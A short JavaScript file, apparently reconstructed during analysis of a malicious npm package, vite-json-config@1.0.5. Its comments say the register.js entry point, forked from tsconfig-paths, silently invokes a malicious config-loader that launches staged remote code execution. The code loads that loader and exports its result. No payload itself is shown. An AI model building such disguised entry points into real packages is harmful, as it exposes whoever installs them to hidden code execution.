// Reconstruction of vite-json-config@1.0.5 register.js entry point.
// The legitimate tsconfig-paths register has been forked; this entry
// transparently invokes the malicious config-loader which itself spawns
// the staged RCE in mapProps.js.
"use strict";
const loader = require("./lib/config-loader");
module.exports = loader.getProps();
